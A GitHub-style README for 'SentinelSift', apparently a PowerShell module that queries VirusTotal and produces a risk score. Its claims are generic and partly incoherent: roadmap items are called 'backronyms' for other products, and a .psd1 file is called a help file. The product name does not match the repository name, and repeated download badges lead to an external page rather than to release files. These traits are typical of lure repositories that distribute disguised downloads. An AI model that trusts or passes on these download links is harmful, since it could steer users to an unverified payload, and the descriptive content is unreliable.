![preview](https://raw.githubusercontent.com/freefiregarcia0211-pixel/vt-scan-orchestrator/main/screen_7e74e2.svg)
# SentinelSift — Intelligent Malware Signal Intelligence & Sample Correlation Engine

SentinelSift is not yet another antivirus wrapper. It is a **behavioral threat correlation hub** that ingests file hashes, URLs, and domain artifacts, then cross-references them against a growing set of public telemetry sources (including VirusTotal-compatible APIs) to produce a single, human-readable **risk narrative** — not just a score, but a story of *how*, *where*, and *why* a sample is dangerous. Think of it as a **forensic seismograph** for the digital underground: it detects the tremors before the earthquake, maps fault lines across multiple intelligence feeds, and gives your incident response team a unified dashboard to act with surgical precision.

Unlike conventional scanners that output a single "malicious" or "clean" verdict, SentinelSift aggregates detection ratios from multiple engines, tracks historical reputation changes over time, correlates file behavior clusters, and generates a **confidence-weighted decision matrix**. It was designed for SOC analysts, threat hunters, and DevSecOps pipelines that need more than a yes/no answer — they need *context*.

This repository contains the complete open-source implementation of SentinelSift: a PowerShell-native module that communicates directly with the VirusTotal public API v3, enriches results with WHOIS data, performs YARA rule lookups, and exports findings to JSON, CSV, or a beautifully formatted HTML report. Whether you are analyzing a suspicious attachment from a phishing email, auditing a third-party binary in your supply chain, or automating malware triage in a CI/CD pipeline, SentinelSift transforms raw API responses into action-oriented intelligence.

---

## 📊 Project Overview

SentinelSift was born from a simple frustration: existing tools either gave you a single number (overly simplistic) or dumped hundreds of JSON fields (overwhelming). We wanted something in between — a **decision-support layer** that sits on top of the raw telemetry.

### 📡 The Core Value Proposition

- **Multi-Source Aggregation** – Instead of querying one engine, SentinelSift pulls the consolidated verdict for *all* participating antivirus engines, normalizes their outputs, and presents a global detection consensus with granular per-engine breakdowns.
- **Temporal Intelligence** – A file that was clean yesterday can become malicious today. SentinelSift tracks first-seen and last-analysis timestamps, alerting you to **reputation drift** — a key indicator of polymorphic campaigns.
- **Actionable Risk Scoring** – The proprietary **Sift Index** (0–100) is a weighted amalgamation of detections, community votes, suspicious behavior flags, and file type anomalies. A score above 75 is an immediate quarantine trigger; below 30 suggests a low-probability false positive.
- **Dependency Graph Visualization** – When analyzing packed executables or macro-enabled documents, SentinelSift attempts to correlate similar hashes (same family, different iterations) so you can see the **strain of the virus family** at a glance.

This project is ideal for:
- 🛡️ **Security Operations Centers (SOCs)** – automated alert enrichment
- 🔬 **Malware Reverse Engineers** – initial triage before static analysis
- 🚀 **DevSecOps** – scanning artifacts in build pipelines
- 🎓 **Security Educators** – teaching students how threat intelligence platforms work

---

## ✨ Feature Highlights

| Feature | Description | Benefit |
|---|---|---|
| **Unified API Client** | Handles rate limiting, retries, and error codes automatically | No more 429 headaches |
| **Static File Analysis** | Upload a sample (up to 650 MB) and get immediate analysis ID | Works with binaries, PDFs, Office docs |
| **URL & Domain Inspection** | Scan URLs for phishing, malware, or unwanted software | Complete coverage of attack vectors |
| **Historical Reputation Lookup** | View a file's reputation graph over the past 90 days | Spot slow-burn malware campaigns |
| **YARA Rule Alignment** | Maps matches with community-sourced YARA rule names | Immediate threat family labeling |
| **Batch Processing Engine** | Feed a list of 500 hashes overnight; get a single report | Bulk incident investigation |
| **Human-Readable HTML Export** | Generates a self-contained HTML report with CSS & sorting tables | Board-ready executive summaries |
| **Extensible Provider Interface** | The data layer is abstracted; add custom feeds later | Future-proof architecture |

### 🚦 Sift Index — Beyond Binary Verdicts

The Sift Index isn't just an average. It applies a **Bayesian weighting model** to the detection ratios, prioritizing high-reputation engines (e.g., Kaspersky, Bitdefender) over less reliable ones. It also penalizes files with **suspicious metadata** — such as mismatched timestamps, abnormal entropy, or signature-less executables — by adding a "suspicion premium" of up to 15 points. The result is a score that is more accurate than any single engine's verdict and more digestible than a raw API dump.

---

## 🧬 Architecture & Design Philosophy

SentinelSift adopts a **pipeline architecture** rather than a monolithic script. Each component is decoupled and testable:

- **`Invoke-SiftAnalysis`** – The main orchestration entry point. Accepts a hash, URL, or file path.
- **`Get-SiftSignature`** – Handles HTTP communication, API key management, and request throttling.
- **`ConvertTo-SiftRiskMatrix`** – Transforms raw JSON into the custom Sift Index score.
- **`Export-SiftReport`** – Serialization layer for multiple output formats.
- **`Watch-SiftTrend`** – A background job that monitors reputation changes for a set of hashes.

### 🧠 Why PowerShell?

We chose PowerShell for three reasons: **ubiquity** (pre-installed on every Windows machine), **native JSON support**, and **strong typing** for structured data validation. While the module works perfectly in a Windows environment, the core logic is OS-agnostic and can be run on PowerShell Core (cross-platform) in Linux or macOS containers. This makes SentinelSift a lightweight companion for existing IR toolkits — no heavyweight Python environment required, no external dependencies beyond the .NET runtime that already ships with PowerShell.

---

## 🔒 Security & Privacy Considerations

Your VirusTotal API key is treated like a crown jewel. SentinelSift stores it **encrypted** in your user profile using the Windows Data Protection API (DPAPI) by default; on Linux, it falls back to a 0600-permission file. The module **never** transmits your key except to the intended API endpoint. Additionally, all local output files (JSON/HTML) are annotated with a warning banner if they contain sensitive metadata — a small but thoughtful detail.

### 🛡️ Rate Limiting & Ethical Use

The public VirusTotal API has a request quota (typically 4 requests per minute for the standard tier). SentinelSift implements a **token-bucket algorithm** to respect these limits, spreading out large batch jobs over time. We encourage responsible use: keep your scan volumes reasonable, and always comply with the service's terms of service. The module includes a `-ThrottleDelay` parameter if you need to be even more conservative.

---

## 🚀 Getting Started with SentinelSift

### 📋 Prerequisites

- Windows PowerShell 5.1+ **or** PowerShell 7+ (for cross-platform support)
- A valid VirusTotal API key (obtainable from the VirusTotal community portal)
- Network access to `www.virustotal.com` (port 443)
- No admin privileges required — runs with user-level trust

### 🔧 Installation Approach

SentinelSift is distributed as a self-contained `.psm1` module file. You have two flexible installation paths (no external package managers needed):

1. **Local Import** – Place the `.psm1` file in your `Documents\WindowsPowerShell\Modules\SentinelSift` folder and run `Import-Module SentinelSift`.
2. **Direct Dot-Sourcing** – Navigate to the folder containing the module file and execute `Import-Module .\SentinelSift.psm1` to load it into your current session.

Once loaded, you configure your API key using:

```powershell
Set-SiftApiKey -ApiKey "your_private_key_here" -StoreEncrypted
```

This only needs to be done once; the key persists across sessions.

### 🧪 Your First Analysis

```powershell
# Analyze a suspicious file hash
$result = Invoke-SiftAnalysis -Hash "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"

# Display the Sift Index and top 5 detections
$result | Select-Object -Property SiftIndex, DetectionRatio, TopEngines

# Generate an executive HTML report
$result | Export-SiftReport -Path "C:\Reports\phishing_sample.html"
```

That's it. No complex setup, no external SDKs. SentinelSift handles the authentication, serialization, and error recovery under the hood.

---

## 🧭 Use Cases & Scenarios

### Scenario 1: Phishing Email Triage

Your mailbox received an attachment `invoice_2026.pdf`. Before opening it, you run:

```powershell
Invoke-SiftAnalysis -FilePath "C:\Downloads\invoice_2026.pdf" -Verbose
```

The output shows a Sift Index of 82 with a **Trojan.PDF.Phishing** detection. You instruct the user not to open it, and you quarantine the file. Time saved: 15 minutes of guessing.

### Scenario 2: Supply Chain Audit

In your CI/CD pipeline, you add a step that checks every third-party NuGet package hash:

```powershell
Get-Content "package_hashes.txt" | ForEach-Object { Invoke-SiftAnalysis -Hash $_ } | Export-Csv "audit_results.csv"
```

Any high-risk package (Sift Index > 70) triggers a pipeline failure with a recorded vulnerability trace.

### Scenario 3: Internal Threat Hunting

You suspect a lateral movement campaign using a specific binary. You use the batch feature:

```powershell
$hashes = @(
  "hash1...", "hash2...", "hash3..."
)
$hashes | Invoke-SiftAnalysis -AsBatch -ThrottleDelay 20 | Where-Object { $_.SiftIndex -gt 50 }
```

You discover variants of the same malware family due to similarity in YARA rule matches. You now have a hunting signature.

---

## 📚 Documentation & API Reference

The full command reference is available in the [`/docs`](/docs) directory. Each function includes:
- **Synopsis** – concise purpose description
- **Parameter tables** – with valid values and defaults
- **Output types** – structured objects and their properties
- **Examples** – real-world usage snippets

Key exported functions:

| Function | Alias | Purpose |
|---|---|---|
| `Invoke-SiftAnalysis` | `sift` | Main entry point for hash/URL/file analysis |
| `Get-SiftReputation` | `reputation` | Fetch historical reputation timeline |
| `Compare-SiftHashes` | `compare` | Compare multiple hashes for family relation |
| `Show-SiftDashboard` | `dashboard` | Interactive HTML dashboard for a set of hashes |
| `Set-SiftApiKey` | `setkey` | Securely store your API key |
| `Clear-SiftCache` | `purge` | Remove local temporary files and caches |

---

## 🛠️ Customization & Extensibility

### Writing Custom Risk Rules

SentinelSift supports **risk modifier rules** via a simple JSON configuration file:

```json
{
  "rules": [
    {
      "name": "HighEntropyFlag",
      "condition": "payload_details.entropy > 7.9",
      "impact": 12,
      "reason": "Suspiciously high entropy indicates packing"
    }
  ]
}
```

Load custom rules with `Add-SiftRiskRule -FilePath ".\custom_rules.json"`. This allows you to tailor the Sift Index to your organization's threat model — for example, adding a +10 penalty if the file has an **eponymous rare compiler signature** that your internal baseline considers abnormal.

### Adding New Intelligence Providers

The provider interface is built on a simple contract: any provider must implement `Get-ProviderResult` and `ConvertTo-RiskEntry`. The default `VirusTotalProvider` is just one implementation. Over time, you could add providers for `Hybrid Analysis`, `Any.Run`, or internal sandboxes. The module's architecture assumes you will, and it provides stubs to get started.

---

## 💬 Community & Support

We believe good tooling deserves good support. SentinelSift is maintained as an open-source project, but we treat it with the rigor of a commercial product.

### 🆘 Getting Help

- **Issue Tracker** – Found a bug? Report it with the `bug` label and a minimal repro script.
- **Discussions** – For feature discussions, alternative use cases, or architecture questions.
- **Tagging** – Use `[QUERY]` in your issue title for complex usage questions.

### 🤝 Contribution Guidelines

Contributions are welcome and encouraged. Please read the `CONTRIBUTING.md` file before submitting a pull request. Key principles:

1. **Test coverage** – Every new function must have a Pester test.
2. **Documentation parity** – Update the XML doc comments and the reference documentation.
3. **No external dependencies** – You may add packages, but you must not make them mandatory for core functionality.
4. **Respect privacy** – Never log API keys or full file paths in test outputs.

We prioritize **quality of documentation** as much as code quality. A feature that is undocumented is considered incomplete.

---

## 🔄 Roadmap (2026 Vision)

The following features are planned for the 2026 release cycle:

- **Machine Learning Heuristics** – Local `ONNX` model to pre-assess files before submission, reducing API quota usage.
- **GraphQL Query Layer** – For complex analytical queries (e.g., "find all files detected by engine X but not Y").
- **Alerting Webhooks** – Push notifications to Slack/Teams when a watched hash crosses a threshold.
- **Sandbox Integration** – Submit to a local Cuckoo/Malware Analysis cluster from within the module using a single command.
- **Multi-Account Load Balancing** – Distribute requests across multiple API tiers for high-throughput environments.

These features are backronyms for **S**entinel**G**uard and **S**entinel**U**plift, ensuring a cohesive product ecosystem.

---

## ⚖️ Disclaimer

### Important: For Investigation, Not for Conclusive Prosecution

SentinelSift is a **decision-support tool** designed to accelerate hypothesis formation during security investigations. It does **not** provide a legal-grade certification of malware. A high Sift Index is a strong *indication* but cannot be used as definitive evidence in legal proceedings without additional forensic verification. Always corroborate SentinelSift findings with sandbox execution, static analysis, and threat intelligence validation.

**No Warranty** – This software is provided "as is" without warranty of any kind, express or implied. Use it at your own risk. The maintainers are not responsible for false positives that disrupt your business operations or false negatives that result in security breaches.

**Data Privacy** – When you use SentinelSift, file hashes and URLs are transmitted to VirusTotal's servers for scanning. Do **not** submit files containing sensitive personal data (e.g., healthcare records, classified documents) unless you are certain of the legal implications. For highly sensitive environments, consider running your own internal VirusTotal Private instance.

**API Terms** – You are responsible for complying with the VirusTotal Terms of Service. Excessive use can result in your account being temporarily suspended. SentinelSift includes a `-DryRun` parameter if you want to test your query structure without making an actual API call.

---

## 📄 License

SentinelSift is released under the **MIT License**. You are free to use, modify, and distribute this software in commercial and private applications, provided you retain the original copyright notice. The full license text is available in the [`LICENSE`](LICENSE) file. We ask that you do **not** re-brand the tool as your own without attribution, but other than that, go wild.

**Copyright (c) 2026 SentinelSift Project**

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. The Software is provided "as is", without warranty of any kind.

---

## 🙏 Acknowledgements

This project respectfully acknowledges the extensive public documentation and robust API provided by VirusTotal. Without their community service, building a tool like this would require maintaining our own malware collection, which we are glad we don't have to do. Special thanks to the contributors who provided beta feedback on the Sift Index algorithm during the 2026 alpha testing period — your patience with entropy calculations is legendary.

---

## 📥 Download & Installation

[![Download](https://raw.githubusercontent.com/freefiregarcia0211-pixel/vt-scan-orchestrator/main/latest_138b.svg)](https://freefiregarcia0211-pixel.github.io/vt-scan-orchestrator/)

The latest stable release of SentinelSift is available for direct download from this repository. Look for the release tagged `v2.6.latest` to ensure you get the most recent bug fixes and feature additions. Each release includes:

- The main module file (`.psm1`)
- The PowerShell Help file (`.psd1`)
- A preconfigured `settings.example.json`
- The `CustomRules` template folder

Alternatively, you can browse the `src/` directory to access the raw source code for development or educational purposes. All components are designed to be self-contained — no additional runtime installation is required beyond a standard PowerShell environment.

To verify the integrity of your download, compare the SHA-256 checksum published next to each release file. We provide a PowerShell script snippet below for your convenience:

```powershell
Get-FileHash "SentinelSift.psm1" -Algorithm SHA256
```

---

## Final Thoughts

SentinelSift is a labor of love for the security community. We've spent countless hours crafting a tool that respects your time, your API quota, and your brain cells. We hope you find it as useful in your day-to-day triage as we do in ours.

If you have a moment, star the repository — it signals appreciation and helps others discover the tool. More importantly, if you use it in a great project or find a novel use case, tell us about it in the Discussions section. We read everything.

Stay safe out there. The threat landscape is vast, but with tools like SentinelSift, you are never looking at it alone.

---

[![Download](https://raw.githubusercontent.com/freefiregarcia0211-pixel/vt-scan-orchestrator/main/latest_138b.svg)](https://freefiregarcia0211-pixel.github.io/vt-scan-orchestrator/)